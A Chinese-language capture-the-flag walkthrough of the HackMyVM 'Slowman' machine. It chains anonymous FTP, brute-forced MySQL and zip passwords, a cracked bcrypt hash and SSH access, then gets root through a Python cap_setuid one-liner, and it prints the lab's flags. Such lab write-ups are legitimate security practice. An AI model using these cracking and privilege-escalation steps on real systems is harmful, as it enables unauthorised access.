# Slowman

2025.03.25 https://hackmyvm.eu/machines/machine.php?vm=Slowman

[video]()

## Ip

192.168.5.40

## Scan

```
PORT     STATE  SERVICE
20/tcp   closed ftp-data
21/tcp   open   ftp
22/tcp   open   ssh
80/tcp   open   http
3306/tcp open   mysql
```

web 上什么都没有。

ftp 可匿名，进入后修改成 passive 模式，得到 allowedusersmysql.txt 内容 trainerjeff ，给了 mysql 用户名，直接爆破，得到密码 soccer1

登陆数据库发现 trainers_db.users 表，内容：

```
MySQL [trainers_db]> select * from users;
+----+-----------------+-------------------------------+
| id | user            | password                      |
+----+-----------------+-------------------------------+
|  1 | gonzalo         | tH1sS2stH3g0nz4l0pAsSWW0rDD!! |
|  2 | $SECRETLOGINURL | /secretLOGIN/login.html       |
+----+-----------------+-------------------------------+
```

使用 gonzalo 用户凭据登陆 http://192.168.5.40/secretLOGIN/login.html 发现文件 http://192.168.5.40/secretgym/serverSHARE/credentials.zip 下载。

zip 有密码，爆破得到解压密码 spongebob1 得到内容：

```
$USERS: trainerjean

$PASSWORD: $2y$10$DBFBehmbO6ktnyGyAtQZNeV/kiNAE.Y3He8cJsvpRxIFEhRAUe1kq
```

再次爆破，得到明文密码 tweety1 使用用户名 trainerjean 登陆 ssh。

先拿到 user flag：

```
trainerjean@slowman:~$ cat user.txt
YOU9et7HEpA$SwordofS10wMan!!
```

进行系统枚举，发现 getcap : /usr/bin/python3.10 cap_setuid=ep 直接运行命令 setuid(0)拿到 root 权限：

```
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```
root@slowman:/root# cat root.txt
Y0UGE23t7hE515roo7664pa5$WoRDOFSlowmaN!!
```
